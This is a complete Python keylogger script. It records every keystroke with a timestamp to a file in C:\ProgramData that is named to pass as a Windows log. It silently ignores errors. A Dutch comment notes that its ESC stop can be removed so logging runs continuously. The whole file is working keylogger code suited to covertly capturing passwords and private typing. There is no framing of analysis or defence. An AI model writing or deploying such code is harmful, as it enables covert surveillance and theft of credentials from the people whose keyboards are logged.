from pynput import keyboard
import datetime

LOG_FILE = "C:\\ProgramData\\windows_log.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"[{timestamp}] {key.char}\n")
            else:
                special = str(key).replace('Key.', '')
                f.write(f"[{timestamp}] <{special}>\n")
    except:
        pass

def on_release(key):
    # Stop bij ESC (optioneel, je kunt het weglaten voor continue logging)
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()